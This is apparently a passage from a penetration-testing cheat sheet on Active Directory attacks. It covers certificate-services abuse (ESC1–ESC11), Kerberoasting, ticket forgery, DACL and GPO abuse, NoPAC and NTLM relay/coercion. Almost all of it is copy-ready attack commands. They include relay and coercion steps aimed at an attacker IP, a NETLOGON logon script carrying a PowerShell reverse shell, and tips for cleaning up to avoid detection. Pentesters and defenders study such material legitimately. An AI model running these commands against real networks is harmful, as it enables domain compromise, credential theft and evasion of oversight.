Certify.exe cas

# Certipy (Kali) — enabled templates + CA; text/JSON/BloodHound output
certipy-ad find -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -enabled

# Only flagged vulns to console; -hashes works in place of -p
certipy-ad find -u '[user]@[domain]' -hashes [hash] -dc-ip [dc-ip] -vulnerable -stdout

# certutil — CA config / EDITF flags (native, no tooling upload)
certutil.exe -config "[ca]" -getreg policy\EditFlags

Key fields to read: EKU / pkiextendkeyusage (authentication present?), msPKI-Certificate-Name-Flag for ENROLLEE_SUPPLIES_SUBJECT, mspki-enrollment-flag (manager approval), Authorized Signatures Required: 0, Enrollment Rights granted to low-priv groups (Domain Users/Computers), the CA's EDITF_ATTRIBUTESUBJECTALTNAME2 flag, and the CA object ACL (ManageCA/ManageCertificates).

ESCMisconfigurationRequired rightsTool
ESC1Template: enrollee-supplied SAN + auth EKU, no approval/signatureEnroll on templatecertipy req -upn / Certify request /altname
ESC2Template has Any Purpose EKU (or no EKU) / SubCAEnroll on templatecertipy req -template
ESC3Template grants Certificate Request Agent EKUEnroll on agent templatecertipy req -on-behalf-of -pfx
ESC4Weak ACL on the template object (Write/FullControl)Write on templatecertipy template -write-default-configuration
ESC5Weak ACL on a PKI object (CA server / NTAuth / OID container)Write on PKI objectPowerView / certipy
ESC6CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 setEnroll on any auth templatecertipy req -upn
ESC7Weak ACL on the CA (ManageCA / ManageCertificates)ManageCA / ManageCertificatescertipy ca -enable-template / -issue-request
ESC8HTTP web enrollment enabled, no channel bindingCoercible victimntlmrelayx --adcs / certipy relay
ESC9Template has CT_FLAG_NO_SECURITY_EXTENSIONGenericWrite on a victim usercertipy account update -upn
ESC10Weak cert mappings (StrongCertificateBindingEnforcement / SChannel)GenericWrite on a victim usercertipy account update -upn
ESC11ICPR (RPC) enrollment without IF_ENFORCEENCRYPTICERTREQUESTCoercible victimcertipy relay rpc://

9.11.2 Authenticating with a Certificate

Every ESC ends here: a PFX (cert + private key) is exchanged for a TGT via PKINIT, yielding a usable ticket and, where the KDC returns it, the account's NT hash (UnPAC-the-hash). Subsequent ESCs reference this step rather than repeating it.

  • Windows — Rubeus requests and injects the TGT; /getcredentials also recovers the NT hash:
    Rubeus.exe asktgt /user:[user] /certificate:cert.pfx /password:[password] /getcredentials /ptt
  • Linux — Certipy does PKINIT and prints TGT + NT hash in one step:
    certipy-ad auth -pfx [user].pfx -dc-ip [dc-ip]
  • Manual PKINIT — gettgtpkinit.py [domain]/[user] -cert-pfx [user].pfx out.ccache then getnthash.py [domain]/[user] -key [as-rep-key] to derive the NT hash from the AS-REP.
  • Certify returns a PEM; convert before use:
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

9.11.3 ESC1 — Enrollee-Supplied SAN

Template lets the enrollee supply the SAN, has an authentication EKU, requires no manager approval or authorized signature, and permits low-priv enrollment — request a cert naming a Domain Admin as the SAN.

# Certify — request with attacker-chosen SAN
Certify.exe request /ca:[ca] /template:[template] /altname:administrator

# Certipy — request as administrator via -upn (then auth, see 8.11.2)
certipy-ad req -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -template [template] -upn administrator@[domain]

9.11.4 ESC2 — Any Purpose / SubCA EKU

Template carries the Any Purpose EKU (or no EKU restriction); the cert can be used for client authentication. If the template also allows enrollee-supplied SAN, abuse it exactly like ESC1.

# Certify
Certify.exe request /ca:[ca] /template:[template] /altname:administrator

# Certipy (then auth, see 8.11.2)
certipy-ad req -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -template [template] -upn administrator@[domain]

9.11.5 ESC3 — Enrollment Agent Certificate

Template grants the Certificate Request Agent EKU; enrol an agent cert, then use it to request a cert on behalf of any user (two-step).

# Certipy — 1) obtain agent cert  2) request on-behalf-of with -pfx (then auth, 8.11.2)
certipy-ad req -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -template [template]
certipy-ad req -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -template User -on-behalf-of '[domain]\administrator' -pfx [user].pfx

# Certify — agent cert, then on-behalf-of enrolment using it
Certify.exe request /ca:[ca] /template:[template]
Certify.exe request /ca:[ca] /template:User /onbehalfof:[domain]\Administrator /enrollcert:cert.pfx

9.11.6 ESC4 — Vulnerable Template ACL

You hold Write/FullControl over a template object — rewrite it into an ESC1 config, enrol, then restore the original to stay quiet.

# Certipy — save original, push a vulnerable default config, abuse as ESC1, restore
certipy-ad template -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -template [template] -write-default-configuration -save-old
certipy-ad req -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -template [template] -upn administrator@[domain]
certipy-ad template -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -template [template] -configuration [template].json

# Windows — grant enrolment / flip flags via PowerView, then enrol as ESC1
Set-DomainObjectAcl -TargetIdentity [template] -PrincipalIdentity [user] -RightsGUID '0e10c968-78fb-11d2-90d4-00c04f79dc55' -TargetSearchBase "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[dc],DC=[tld]"
Certify.exe request /ca:[ca] /template:[template] /altname:administrator

9.11.7 ESC5 — Vulnerable PKI Object ACL

A low-priv principal has dangerous rights over a PKI object outside the templates — the CA computer object, the NTAuthCertificates / Enrollment Services container, or the CA's AD object — letting you reconfigure the CA or push a rogue root and ultimately reach an ESC1-style enrolment.

# Certipy — enumerate object ACLs (often through a proxy to the internal CA)
certipy-ad find -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -stdout -ns [dc-ip] -dns-tcp

# PowerView — inspect/abuse ACLs on the PKI container, then enrol as ESC1/ESC7
Get-DomainObjectAcl -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,DC=[dc],DC=[tld]" -ResolveGUIDs

9.11.8 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, so it honours an attacker-supplied SAN on any auth template (e.g. the default User) — a CA-wide ESC1.

# Certipy — supply SAN UPN on a normal template (then auth, see 8.11.2)
certipy-ad req -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -template User -upn administrator@[domain]

# Certify
Certify.exe request /ca:[ca] /template:User /altname:administrator

9.11.9 ESC7 — Vulnerable CA ACL

You hold ManageCA and/or ManageCertificates on the CA itself, letting you enable templates and approve your own requests.

  • With ManageCA: enable the built-in SubCA template (allows SAN) — certipy-ad ca ... -enable-template SubCA.
  • Grant yourself approval power: certipy-ad ca ... -add-officer [user] (ManageCertificates).
  • Request against SubCA (it fails pending approval, note the request ID), then issue and retrieve it.
# Certipy — enable SubCA + become officer
certipy-ad ca -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -enable-template SubCA
certipy-ad ca -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -add-officer [user]

# Request (denied -> note ID), approve it, retrieve the issued cert (then auth, 8.11.2)
certipy-ad req -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -template SubCA -upn administrator@[domain]
certipy-ad ca  -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -issue-request [id]
certipy-ad req -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -ca [ca] -retrieve [id]

9.11.10 ESC8 — NTLM Relay to Web Enrollment

The CA exposes the HTTP web-enrollment endpoint (/certsrv/) with NTLM and no channel binding — coerce a privileged machine (e.g. a DC) and relay its auth to enrol a cert as that account.

  • Relay target is the CA's certfnsh.asp; request the DomainController/Machine template when relaying a DC.
  • Coerce with PetitPotam/Coercer (EfsRpc) or PrinterBug; the resulting [host]$.pfx authenticates as that machine account.
  • Auth the DC cert (8.11.2) to get the DC$ hash, then DCSync with secretsdump.
# Impacket — relay coerced auth to the web-enrollment endpoint
impacket-ntlmrelayx -t http://[ca]/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

# Certipy relay (modern equivalent)
certipy-ad relay -target http://[ca] -template DomainController

# Coerce the DC to authenticate to the relay
coercer coerce --target-ip [dc-ip] -l [attacker-ip] -u [user] -p [password] --filter-method-name EfsRpcAddUsersToFile

# Auth as the DC machine account, then DCSync (see 8.11.2 for auth)
impacket-secretsdump '[domain]/[dc-host]$@[dc-ip]' -hashes [hash]

9.11.11 ESC9 — No Security Extension

A template flagged CT_FLAG_NO_SECURITY_EXTENSION omits the SID security extension, so the cert is mapped purely by UPN. With GenericWrite over a victim user, set its UPN to the target, enrol, then restore.

  • Take over the victim (shadow creds or password reset), set userPrincipalName to the target (e.g. administrator) — drop the @domain suffix to avoid collisions.
  • Enrol the no-extension template as the victim; the issued cert maps to the target.
  • Restore the victim's original UPN, then auth the cert (8.11.2).
# Certipy — own victim, repoint UPN, enrol, restore
certipy-ad shadow auto -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -account [victim]
certipy-ad account update -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -user [victim] -upn administrator
certipy-ad req -u '[victim]@[domain]' -hashes [hash] -dc-ip [dc-ip] -ca [ca] -template [template]
certipy-ad account update -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -user [victim] -upn [victim]@[domain]

# Windows equivalent — reset/own victim, repoint UPN, enrol as victim
Set-DomainObject [victim] -Set @{'userPrincipalName'='administrator'} -Verbose
Certify.exe request /ca:[ca] /template:[template]

9.11.12 ESC10 — Weak Certificate Mappings

The DC has weakened cert mapping — Kerberos StrongCertificateBindingEnforcement=0/1 (Case 1) or SChannel CertificateMappingMethods with the UPN bit (Case 2) — allowing UPN-based impersonation like ESC9, but on any client-auth template.

  • Confirm the registry value first (reg.py ... query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc' or the SecurityProviders\SCHANNEL key).
  • Case 1 (Kerberos): own a victim, set its UPN to the target user, enrol the default User template, restore, auth.
  • Case 2 (SChannel): set the victim UPN to a machine account (e.g. [dc-host]$@[domain]), enrol, then drive an LDAP shell as that machine to add a computer / set RBCD.
# Case 1 — UPN repoint to a target user, enrol User template, restore (auth: 8.11.2)
certipy-ad shadow auto -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -account [victim]
certipy-ad account update -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -user [victim] -upn administrator
certipy-ad req -u '[victim]@[domain]' -hashes [hash] -dc-ip [dc-ip] -ca [ca] -template User
certipy-ad account update -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -user [victim] -upn [victim]@[domain]

# Case 2 (SChannel) — repoint to a machine account, then LDAP shell as it
certipy-ad account update -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -user [victim] -upn '[dc-host]$@[domain]'
certipy-ad req -u '[victim]@[domain]' -hashes [hash] -dc-ip [dc-ip] -ca [ca] -template User
certipy-ad auth -pfx [dc-host].pfx -dc-ip [dc-ip] -ldap-shell

9.11.13 ESC11 — Relay to ICPR (RPC Enrollment)

The CA's ICPR (RPC) enrollment interface lacks the IF_ENFORCEENCRYPTICERTREQUEST flag, so coerced NTLM can be relayed over RPC instead of HTTP — same outcome as ESC8 without web enrollment.

# Certipy relay to the RPC/ICPR endpoint (specify the CA name)
certipy-ad relay -target 'rpc://[target]' -ca '[ca-name]' -template DomainController

# Coerce the DC to authenticate to the relay (auth the resulting pfx: 8.11.2)
python3 PetitPotam.py -u [user] -p [password] -d [domain] [attacker-ip] [dc-ip]

9.12 Kerberoasting & AS-REP Roasting

Request tickets whose encrypted portion is derived from an account's password, then crack them offline. Kerberoasting targets SPN-bearing user accounts (TGS-REP); AS-REP roasting targets accounts with pre-authentication disabled (AS-REP).

AttackPreconditionToolHashcat mode
KerberoastingAny valid domain credentials + a user account with an SPN setGetUserSPNs / Rubeus kerberoast / Invoke-Kerberoast13100 (etype 23) / 19700 (etype 18 AES256)
Targeted KerberoastingGenericWrite/GenericAll over a target user (write its SPN)PowerView Set-DomainObject + roast13100
AS-REP RoastingAccount with DONT_REQ_PREAUTH (no creds required)GetNPUsers / Rubeus asreproast18200
Targeted AS-REP RoastingGenericWrite/GenericAll (set DONT_REQ_PREAUTH)PowerView (XOR UAC) + roast18200

9.12.1 Kerberoasting

# Enumerate SPNs and request TGS hashes (Linux)
impacket-GetUserSPNs [domain]/[user]:'[password]' -dc-ip [dc-ip]
impacket-GetUserSPNs [domain]/[user]:'[password]' -dc-ip [dc-ip] -request -outputfile hashes.txt

# Roast a single account
impacket-GetUserSPNs [domain]/[user]:'[password]' -dc-ip [dc-ip] -request-user [target]

# Roast all SPN accounts (Windows)
.\Rubeus.exe kerberoast /nowrap /outfile:hashes.txt

# Specific user, and force RC4 for AES-enabled accounts (easier to crack)
.\Rubeus.exe kerberoast /user:[target] /nowrap
.\Rubeus.exe kerberoast /tgtdeleg /nowrap

# Stats only — no ticket requests (check etypes, password-set dates)
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /pwdsetafter:01-01-2000 /pwdsetbefore:01-01-2015 /nowrap

# Enumerate and roast with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash

# Crack TGS-REP hashes
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -O
  • RC4 hashes start $krb5tgs$23$*; AES256 hashes start $krb5tgs$18$* and are far slower to crack.
  • With a DONT_REQ_PREAUTH account you can roast without any password: Rubeus.exe kerberoast /nopreauth:[user] /spn:[spn] /nowrap.

9.12.2 Targeted Kerberoasting

With write access over a user that has no SPN, set one, roast it, then remove it to clean up.

# Set a fake SPN on a user you can write to
Import-Module .\PowerView.ps1
Set-DomainObject -Identity [target] -Set @{serviceprincipalname='fake/[target]'} -Verbose

# Roast the now-SPN'd account
.\Rubeus.exe kerberoast /user:[target] /nowrap

# Clean up — remove the SPN
Set-DomainObject -Identity [target] -Clear serviceprincipalname -Verbose

# All-in-one from Linux
targetedKerberoast.py -d [domain] -u [user] -p '[password]' --dc-ip [dc-ip]

9.12.3 AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" return an AS-REP whose encrypted blob is derived from the user's password — requestable by anyone, no credentials needed.

# Enumerate DONT_REQ_PREAUTH accounts (with creds)
impacket-GetNPUsers [domain]/[user]:'[password]' -dc-ip [dc-ip] -request -format hashcat -outputfile hashes.txt

# No credentials — spray a username list
impacket-GetNPUsers [domain]/ -dc-ip [dc-ip] -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass

# Enumerate and roast on Windows
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname

.\Rubeus.exe asreproast /user:[target] /domain:[domain] /dc:[dc-ip] /format:hashcat /nowrap /outfile:hashes.txt
.\Rubeus.exe asreproast /format:hashcat /nowrap

# Targeted: set DONT_REQ_PREAUTH (bit 0x400000) via GenericWrite, then roast, then unset
Set-DomainObject -Identity [target] -XOR @{useraccountcontrol=4194304} -Verbose
.\Rubeus.exe asreproast /user:[target] /format:hashcat /nowrap
Set-DomainObject -Identity [target] -XOR @{useraccountcontrol=4194304} -Verbose

# Crack AS-REP hashes
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -O

9.13 Pass-the-Ticket, Overpass-the-Hash & Silver Tickets

Reuse, derive, or forge Kerberos tickets to authenticate as another principal without their cleartext password.

9.13.1 Pass-the-Ticket

Inject a stolen TGT/ST (.kirbi or .ccache) into a logon session and act as that user, limited to whatever the ticket authenticates against.

# Export cached tickets, then inject one (Windows)
sekurlsa::tickets /export
kerberos::ptt [ticket].kirbi

# Inject a base64/.kirbi ticket with Rubeus
.\Rubeus.exe ptt /ticket:[ticket].kirbi
.\Rubeus.exe ptt /ticket:[base64-ticket]
klist

# Use the ticket to request a service ticket / renew
.\Rubeus.exe asktgs /ticket:[base64-tgt] /service:cifs/[target] /ptt
.\Rubeus.exe renew /ticket:[base64-tgt] /ptt
dir \\[target]\C$

# Linux — convert .kirbi to .ccache and use with impacket -k
impacket-ticketConverter [ticket].kirbi ticket.ccache
export KRB5CCNAME=$(pwd)/ticket.ccache
impacket-psexec -k -no-pass [target]
# unset KRB5CCNAME  to drop the cached ticket

9.13.2 Overpass-the-Hash (Pass-the-Key)

Turn an NTLM/AES key into a full Kerberos TGT, avoiding NTLM on the wire. Prefer /aes256 when available — using /rc4 can trigger encryption-downgrade detections.

# Request a TGT from a hash/key and inject it (Rubeus)
.\Rubeus.exe asktgt /user:[user] /rc4:[hash] /domain:[domain] /ptt
.\Rubeus.exe asktgt /user:[user] /aes256:[aes256-key] /domain:[domain] /ptt

# Mimikatz — spawn a process with the hash injected (overpass-the-hash)
sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[hash] /run:cmd.exe
# /aes256:[aes256-key] is stealthier than /ntlm

# Linux — request a TGT from a hash
impacket-getTGT [domain]/[user] -hashes :[hash] -dc-ip [dc-ip]
export KRB5CCNAME=$(pwd)/[user].ccache

9.13.3 Silver Tickets

Forge a service ticket (ST) directly with a service account's key — no KDC contact, so it is stealthier than a Golden Ticket but scoped to one service on one host.

  • Need: the service account's NTLM hash or AES key, the domain SID, the target SPN, and a username to impersonate.
  • For a machine-account service (e.g. cifs, host), use the computer account's $ hash; that account's key.
  • No PAC validation by default, so group membership can be forged arbitrarily (Domain Admin RIDs).
  • Stays valid until the service account password rotates; computer accounts rotate every ~30 days.
# Forge and inject a Silver Ticket (Mimikatz) — /target + /service make it an ST
kerberos::golden /domain:[domain] /sid:[domain-sid] /user:Administrator /rc4:[hash] /target:[target] /service:cifs /ptt

# Forge a Silver Ticket with impacket ticketer (Linux)
impacket-lookupsid [domain]/[user]:'[password]'@[dc-ip]   # recover domain SID
impacket-ticketer -nthash [hash] -domain-sid [domain-sid] -domain [domain] -spn cifs/[target] Administrator
export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-smbclient -k -no-pass [target]

9.14 DACL Attacks (Extended)

Deeper DACL abuse from the HTB DACL Attacks modules: edge-to-abuse mapping, GPO abuse, computer takeover chains, targeted extended rights, owner/DACL editing from Linux, and group/SPN chains. (Basics of GenericAll/GenericWrite/WriteDACL/WriteOwner, ForceChangePassword, AddMember in 8.8; Shadow Credentials in 8.7; RBCD in 8.6.)

9.14.1 Edge to Abuse Mapping

BloodHound surfaces these as edges; the access mask / object-type GUID tells you which abuse applies.

ACE / Edge Abuse Linux / Windows tool
GenericAll / GenericWrite (user) Targeted Kerberoast (set SPN), Shadow Credentials, ForceChangePassword targetedKerberoast.py, pywhisker, bloodyAD
GenericAll / GenericWrite (computer) RBCD or Shadow Credentials -> takeover bloodyAD add rbcd, pywhisker
WriteOwner Set self as owner, then write DACL (grant FullControl) owneredit.py + dacledit.py, Set-DomainObjectOwner
WriteDACL Grant self any right (ResetPassword, DCSync, FullControl) dacledit.py -action write, Add-DomainObjectAcl
WriteProperty (servicePrincipalName) / Validated-SPN Targeted Kerberoast, SPN-jacking targetedKerberoast.py, addspn.py
WriteProperty (msDS-KeyCredentialLink) / AddKeyCredentialLink Shadow Credentials -> TGT + NT hash pywhisker, Whisker
WriteProperty (scriptPath / Script-Path GUID) Logon-script RCE via NETLOGON payload bloodyAD set object, ldapmodify
WriteProperty on GP-Link (OU/site/domain) WriteGPLink -> link malicious GPO New-GPLink
WriteDACL/Owner/CreateChild on GPC Edit GPO -> scheduled task / local admin pyGPOAbuse, SharpGPOAbuse
User-Force-Change-Password (ExtendedRight) Reset password without knowing old one net rpc password, bloodyAD set password
AllExtendedRights (no ObjectType GUID) DCSync (on domain), password reset, all control rights secretsdump.py, dacledit -rights DCSync

9.14.2 Enumerating Rights (Linux)

impacket dacledit.py (ShutdownRepo fork, run inside its venv) reads/edits a principal's DACL.

# Read full DACL of a target
python3 dacledit.py -target [target] -dc-ip [dc-ip] [domain]/[user]:[password] -action read

# Filter: what rights does -principal have over -target
python3 dacledit.py -principal [user] -target [target] -dc-ip [dc-ip] [domain]/[user]:[password]

# PywerView port of PowerView from Linux (resolve SIDs + GUIDs, filter with jq)
python3 pywerview get-objectacl --name [target] -w [domain] -t [dc-ip] -u [user] -p [password] --resolve-sids --resolve-guids --json | jq '.results | map(select(.securityidentifier | contains("[user]")))'

# bloodyAD get/set object attributes
bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] get object [target] --attr scriptPath

9.14.3 WriteOwner / WriteDACL Chain (Linux)

Take ownership, then grant yourself FullControl, then abuse it (e.g. password reset).

  • WriteOwner -> set yourself owner (owner implicitly holds WriteDacl + ReadControl).
  • As owner, add an ACE granting FullControl/ResetPassword.
  • Then reset the target's password and authenticate.
# Step 1: become the owner
python3 owneredit.py -action write -new-owner [user] -target [target] -dc-ip [dc-ip] [domain]/[user]:[password]

# Step 2: grant FullControl (backs up the DACL automatically)
python3 dacledit.py -principal [user] -target [target] -action write -rights FullControl -dc-ip [dc-ip] [domain]/[user]:[password]

# Step 3: reset the password
net rpc password [target] [new-password] -U [domain]/[user]%[password] -S [dc-ip]

# bloodyAD one-liners for the same primitives
bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] set owner [target] [user]
bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] add genericAll [target] [user]
bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] set password [target] [new-password]

9.14.4 Computer Object Takeover Chains

GenericAll/GenericWrite over a computer object yields two reliable takeover paths. RBCD details in 8.6, Shadow Credentials in 8.7 -- here are the Linux/bloodyAD one-liners.

  • RBCD: configure msDS-AllowedToActOnBehalfOfOtherIdentity, then S4U2self/proxy to impersonate any user to the target.
  • Shadow Credentials: write msDS-KeyCredentialLink, request a TGT via PKINIT, recover the NT hash with U2U.
# RBCD: add an account we control as allowed-to-act on the target computer
bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] add rbcd [target]\$ [controlled-machine]\$

# Shadow Credentials end-to-end from Linux (pywhisker writes the key, PKINITtools gets the TGT/hash)
python3 pywhisker.py -d [domain] -u [user] -p [password] --target [target] --action add
python3 gettgtpkinit.py -cert-pfx [cert].pfx -pfx-pass [pfx-pass] [domain]/[target] [target].ccache
KRB5CCNAME=[target].ccache python3 getnthash.py -key [as-rep-key] [domain]/[target]

9.14.5 Extended Rights & Targeted Kerberoast

WriteProperty over servicePrincipalName (or Validated-SPN) lets you set a temporary SPN and roast the account.

# Sets an SPN, roasts, removes the SPN automatically; --only-abuse targets accounts without an SPN
python3 targetedKerberoast.py -d [domain] -u [user] -p [password] --dc-ip [dc-ip] --request-user [target]

# AllExtendedRights / DS-Replication rights on the domain -> DCSync
python3 dacledit.py -principal [user] -target-dn "DC=[domain-dn]" -action write -rights DCSync -dc-ip [dc-ip] [domain]/[user]:[password]
secretsdump.py [domain]/[user]:[password]@[dc-ip] -just-dc-user krbtgt

9.14.6 Logon Script (scriptPath) Abuse

WriteProperty on a user's scriptPath plus write access in NETLOGON gives code execution as that user on next logon.

  • Confirm write rights inside NETLOGON (smbcacls / icacls).
  • Drop a .bat/.vbs running an encoded PowerShell reverse shell into the writable folder.
  • Point the victim's scriptPath at it (relative path within NETLOGON), then wait for logon.
# Check ACLs on a NETLOGON subfolder
smbcacls //[dc-ip]/NETLOGON /[folder] -U [user]%[password]

# Upload the payload
smbclient //[dc-ip]/NETLOGON --directory [folder] -U [user]%[password] -c "put logonScript.bat"

# Set scriptPath via bloodyAD (relative to NETLOGON)
bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] set object [target] scriptPath -v '[folder]\logonScript.bat'

# Or via ldapmodify with an LDIF replace record
ldapmodify -H ldap://[dc-ip] -x -D '[user]@[domain]' -w '[password]' -f logonScript.ldif
# logonScript.ldif:
#   dn: CN=[target],CN=Users,DC=[domain-dn]
#   changetype: modify
#   replace: scriptPath
#   scriptPath: [folder]\logonScript.bat

9.14.7 GPO Abuse (WriteGPLink / Edit GPO)

Two distinct primitives: editing a GPO you control (push a scheduled task / local admin), or WriteGPLink on an OU/site/domain to link a GPO of your own to a target scope. Effects apply on the next policy refresh (~90 min).

# Find who can modify/link/create GPOs (PowerView wrapper)
Import-Module .\Get-GPOEnumeration.ps1; Get-GPOEnumeration -ModifyGPOs

# Identify GP-Link write rights on OUs (WriteGPLink)
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier

# Edit a controlled GPO: add a user to local admins on every machine in scope
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [user] --GPOName "[gpo-name]"

# Link a GPO to a target OU (requires WriteGPLink on the OU)
New-GPLink -Name [gpo-name] -Target "OU=[ou],DC=[domain-dn]"

# Linux: identify GPO modify rights with dacledit against the GPC DN
python3 dacledit.py [domain]/[user]:[password] -target-dn "CN={[gpo-guid]},CN=Policies,CN=System,DC=[domain-dn]" -dc-ip [dc-ip]

# Linux: push an immediate scheduled task via pyGPOAbuse (creates local admin)
python3 pygpoabuse.py [domain]/[user]:[password] -gpo-id [gpo-guid] -command "net user [new-user] [new-password] /add && net localgroup Administrators [new-user] /add" -taskname "Update" -dc-ip [dc-ip]

9.14.8 SPN-Jacking

An edge case of WriteSPN abuse where a constrained-delegation SPN is moved onto a target computer so the S4U2proxy ticket is encrypted for that target. Avoids password cracking.

  • Ghost SPN-jacking: assign an orphaned (deleted/renamed account) delegation SPN to the target -- no conflict.
  • Live SPN-jacking: clear the SPN from its live owner first (the DC blocks duplicates), assign it to the target, then restore.
  • The ticket is encrypted for the target but the service name is unprotected -- rewrite it with tgssub to a usable class (cifs/http).
# Find orphaned delegation SPNs (PowerView wrapper)
Import-Module .\Get-ConstrainedDelegation.ps1; Get-ConstrainedDelegation -CheckOrphaned

# Linux: clear the SPN from its live owner, then assign to the target (krbrelayx addspn.py)
python3 addspn.py [dc-ip] -u '[domain]\[user]' -p [password] --clear -t '[owner]$' -dc-ip [dc-ip]
python3 addspn.py [dc-ip] -u '[domain]\[user]' -p [password] --spn '[service]/[owner]' -t '[target]$' -dc-ip [dc-ip]

# Request the S4U ticket and rewrite the service name in one shot (getST.py -altservice)
getST.py -spn '[service]/[owner]' -impersonate Administrator '[domain]/[deleg-machine]$' -hashes :[hash] -dc-ip [dc-ip] -altservice "cifs/[target].[domain]"

# Restore the cleared SPNs afterwards (loop with bloodyAD)
for spn in $(cat spns.txt); do bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] add object '[owner]$' servicePrincipalName -v $spn; done

9.14.9 sAMAccountName Spoofing (NoPAC)

CVE-2021-42278 + CVE-2021-42287. Needs the ability to rename a machine/user account (GenericAll/GenericWrite) and MachineAccountQuota > 0 (or an existing controlled account). Rename to a DC name without the trailing $; the KDC re-appends $ on S4U2self and issues a ticket with DC privileges.

  • Clear the account's SPNs, then set its sAMAccountName to the DC short name (no $).
  • Request a TGT as the renamed account; revert the sAMAccountName.
  • S4U2self to self impersonating Administrator -> service ticket as the DC; substitute service (ldap for DCSync).
# Scan for vulnerability (ticket size with/without PAC differs)
python3 noPac/scanner.py -dc-ip [dc-ip] [domain]/[user]:[password] -use-ldap

# bloodyAD: rename a controlled account (GenericAll over felipe) to the DC name
bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] set object [target] sAMAccountName -v [dc-name]
# ... request TGT as [dc-name], then revert (search by current name [dc-name]):
bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] set object [dc-name] sAMAccountName -v [target]

# All-in-one with noPac.py (rename, TGT, S4U2self, restore)
python3 noPac.py [domain]/[user]:[password] -dc-ip [dc-ip] -dc-host [dc-host] --impersonate administrator -use-ldap -dump

9.14.10 Group Nesting & Self-Membership Chains

WriteProperty on a group's member attribute (or Self-Membership validated write, GUID bf9679c0-0de6-11d0-a285-00aa003049e2) lets you add yourself; nested groups mean adding to one group can transitively grant another's rights. Chase the BloodHound MemberOf path to a privileged group.

# Add a principal to a group from Linux
bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] add groupMember "[group]" [user]

# Same via dacledit if you only have WriteDACL (grant WriteMembers first)
python3 dacledit.py -principal [user] -target "[group]" -action write -rights WriteMembers -dc-ip [dc-ip] [domain]/[user]:[password]

# Windows: add member with PowerView, then re-collect to find the new transitive path
Add-DomainGroupMember -Identity "[group]" -Members [user]

9.15 NTLM Relay Attacks

9.15.1 Theory

  • NTLM lacks mutual authentication, so a coerced/poisoned NTLM auth can be relayed to a third host as the victim — never cracking the hash, just forwarding the AUTHENTICATE_MESSAGE.
  • SMB signing defeats SMB→SMB relay (only DCs require it by default; SMB2/3 servers are "not required"). HTTP has no session signing, so HTTP NTLM auth relays anywhere without target preconditions.
  • Target selection: relay over SMB needs a non-signing host; relay over LDAP needs LDAP signing/channel-binding off (or CVE-2019-1040 + --remove-mic); relay over HTTP (ADCS web enrollment) needs only a reachable endpoint.
  • Cross-protocol matters: relay SMB auth → LDAP/RPC/HTTP, or HTTP auth → LDAP, to reach RBCD, Shadow Credentials, and ESC8.

9.15.2 Authentication Coercion

Force a victim (often a DC or computer account) to authenticate to the attacker over SMB or HTTP/WebDAV. Listener as [attacker-ip] for SMB, or NAME@PORT/PATH for HTTP/WebDAV.

# MS-RPRN PrinterBug (printerbug.py / krbrelayx) — SMB coercion
python3 printerbug.py [domain]/'[user]$':'[password]'@[victim-ip] [attacker-ip]
# HTTP/WebDAV coercion: listener as a WebDAV connection string
